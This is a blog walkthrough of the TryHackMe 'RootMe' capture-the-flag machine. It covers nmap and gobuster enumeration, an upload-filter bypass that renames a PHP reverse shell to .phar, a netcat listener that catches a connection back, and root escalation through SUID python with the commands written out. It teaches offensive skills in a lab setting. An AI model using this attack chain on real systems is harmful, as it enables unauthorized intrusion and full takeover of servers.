---
title: Tryhackme RootMe walkthrough
date: 2024-03-17 16:28
categories: [walkthroughs]
tags: [tryhackme, writeup, walkthrough]
---


# Hello
Hello everyone, I try to make my writeups as simple as possible while showing my thought process in hacking the machines. 

Don't read my writeups if you want are not willing to learn, i will **not** give out answers. However, if you are willing to learn, you should read my writeups because i will show my thought process in detail.

## Eumeration
When doing enumeration you almost always want to do an nmap scan with version detection, let's do that: 
```
nmap -sV 10.10.109.74
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-17 09:59 EDT
Nmap scan report for 10.10.109.74
Host is up (0.046s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.15 seconds

```

From this scan you should be able to answer questions 1, 2 and 3


As we can see in the scan, there is an apache web server running on port 80, let's check this out: 

![Alt text](/assets/img/rootme/image.png)

Hmmm, nothing interesting here, let's try and brute force some directories and see if we can find anything interesting.

```
gobuster dir -w /usr/share/wordlists/dirb/big.txt -u 10.10.109.74
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.109.74
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/css                  (Status: 301) [Size: 310] [--> http://10.10.109.74/css/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.109.74/js/]
/panel                (Status: 301) [Size: 312] [--> http://10.10.109.74/panel/]
/server-status        (Status: 403) [Size: 277]
/uploads              (Status: 301) [Size: 314] [--> http://10.10.109.74/uploads/]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```

Wow! This is worth gold, we have got 2 very interesting directories, those are : /panel and /uploads

Let's take a look at the panel directory: ![Alt upload page](/assets/img/rootme/upload.png)

Interesting, we can upload files, let's try uploading one. And looking at the /uploads directory.
Okay, so when we upload a file we are able to see it in the /uploads directory.

## RCE with file uploads

When you can upload files to a server you should always test if you can run RCE (remote code execution) exploits. A great website for generating reverse shells is https://www.revshells.com/

A reverse shell is basically a program that will run on the victims computer and will contact the attackers computer and let the attacker on a shell on the victims computer.

Here is a better schematic picture: 
![Alt rce diagram](https://patchmypc.com/wp-content/uploads/2023/03/Remote-Code-Execution-RCE-Diagram-WEB.jpg)

Let's generate a reverse shell with https://www.revshells.com/ 
![Alt text](/assets/img/rootme/revshells.png)
In the ip input field you will fill in 
**your** local ip, the program will have to know this to contact your machine.

Let's run our netcat server: 
```
nc -lvnp 9999
```

Now take a moment and start thinking yourself, what programming language is used to run web servers as backend?

<details>  <summary>The answer</summary>PHP</details>

Yes, thats right! Let's generate a reverse shell for this language, click the language on the sidebar in revshells and copy the code and put it in a file.

## Uploading our reverse shell

Let's upload our reverse shell, oh shit, we can't upload it...? It's forbidden?

Take a moment and try to search ways we can execute php code without uploading a .php file, maybe we can find another extension. You can also use ChatGPT.

<details>  <summary>The answer</summary>The .phar extension is used to package libraries/applications into single files. It's like Jar files for java.</details>

Let's change our file extension to this extension. Let's try and upload this file.

![Alt upload successful](/assets/img/rootme/upload%20successfull.png)

NICE! It worked, let's now open this file in the /uploads directory & look at our netcat shell.
```
connect to [10.8.110.97] from (UNKNOWN) [10.10.109.74] 42100
SOCKET: Shell has connected! PID: 1433
whoami
www-data
```

THERE IS NO WAY! We got it we got a reverse shell.

<small>As we can see, we are the user www-data, now the user www-data is a user that servers like Apache and Nginx make so that attackers like us will only have restricted access if we manage to be able to get into the machine. This user is purely made for hosting the server, and nothing else.</small>

You can find the user flag by running
```
cat /var/www/user.txt
```

## Privilege escalation

Privilige escalation is increasing ur privileges in your local machine, here is a good schematic picture:

![Alt text](/assets/img/rootme/upload%20successfull.png)

Horizontal is going from user to user, or admin to admin. (for example)

Vertical is going from user to root. (for example)

Every time, again EVERY TIME, you are doing privilege escalation you should ALWAYS check SUID permissions.

<small>Files that have SUID permissions set when executed, will run the privileges of the file 
owner and not the user itself.
</small>

Take a moment, and maybe even ask ChatGPT on how to check SUID permissions.
<details>  <summary>The answer</summary>
find / -user root -perm /4000
</details>

Let's run this command:

```
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
```

Interesting... take a moment and think, how we can utilize running one of these files and get root privileges.

To be honest, you can use multible of these executables to gain privileges. But the most obvious one for me is:
```
/usr/bin/python
```

## Abusing our SUID privileges with python
There is a website you should almost always use for escalating privileges, this website is: https://gtfobins.github.io/

As the website says itself, "GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems."

Now we can use this website by searching up python and selecting SUID, then just copying the code of the last line.
Let's run this: 
```
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

WOOT! LETS GO!

We fucking did it boyz
```
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
whoami
root
```

To find the root flag run this command:
```
cat /root/root.txt
```


Congratulations on completing this machine, I hope you have an amazing rest of your day.

